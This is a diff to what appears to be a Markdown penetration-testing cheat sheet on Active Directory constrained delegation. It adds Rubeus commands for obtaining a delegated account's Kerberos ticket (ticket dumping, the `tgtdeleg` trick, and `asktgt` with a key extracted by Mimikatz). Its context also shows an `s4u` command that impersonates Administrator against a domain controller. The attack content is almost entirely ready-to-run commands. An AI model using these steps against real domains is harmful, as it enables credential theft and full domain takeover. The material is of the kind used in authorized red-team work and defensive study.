@@ -57,16 +57,28 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 ```
 > NOTE: Constrained delegation can be configured on user accounts as well as computer accounts.  Make sure you search for both.
 
+- To perform the delegation, we ultimately need the TGT of the principal (machine or user) trusted for delegation.  
+
+	- We can extract it from a machine (Rubeus `dump`):
+	```
+	.\Rubeus.exe dump /service:svc_name /luid:0xluid /nowrap
+	```
+	- Use the `tgtdeleg` trick:
+	```
+	.\Rubeus.exe tgtdeleg
+	```
+	- Request one using the NTLM/AES keys (Mimikatz `sekurlsa::ekeys` + Rubeus `asktgt)`: 
+	```
+	.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /aes256:2892......1211414
+	```
+
+
 ------------------------------------------------------
 
 # Attack Variants
 
 ## Basic Constrained Delegation Exploitation
 
-- To perform the delegation, we ultimately need the TGT of the principal (machine or user) trusted for delegation.  We can extract it from a machine (Rubeus `dump`) or request one using the NTLM/AES keys (Mimikatz `sekurlsa::ekeys` + Rubeus `asktgt)`: 
-```
-.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892......1211414
-```
 1. Use `s4u2self` and `s4u2proxy` to impersonate the Target user delegated to the allowed SPN: 
 ```
 .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:cifs/dc /ptt
